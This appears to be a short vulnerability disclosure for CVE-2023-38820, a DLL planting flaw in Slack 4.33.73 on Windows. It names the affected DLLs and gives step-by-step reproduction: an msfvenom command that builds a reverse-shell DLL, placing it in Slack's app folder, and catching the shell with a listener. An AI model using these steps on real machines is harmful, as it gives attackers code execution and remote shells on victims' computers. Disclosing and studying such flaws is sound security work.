# DLL-Planting-Slack-4.33.73-CVE-2023-38820
DLL Planting in the Slack 4.33.73 - CVE-2023-38820
Discoverer: Idan Malihi

# Description
An issue in Slack Slack v.4.33.73 allows a local attacker to execute arbitrary code via the DLL loading mechanism in profapi.dll, CRYPTBASE.dll, KBDUS.DLL, DPAPI.dll, MSASN1.dll, mf.dll, mfplat.dll, and RTWorkQ.DLL files.

# Steps to Reproduce
To exploit the vulnerability, an attacker should download and install the Slack program, and follow the steps:
1. Create a malicious dll file with msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o profapi.dll
2. Transfer the malicious dll file to the victim's computer
3. Open the Slack path: "C:\Users\idan.m\AppData\Local\slack\app-4.33.73"
4. Transfer the malicious dll to the Slack path and name it "KBDUS.DLL" for the example.
5. Open netcat or metasploit listener
6. Open Slack.exe
7. Get a reverse shell.
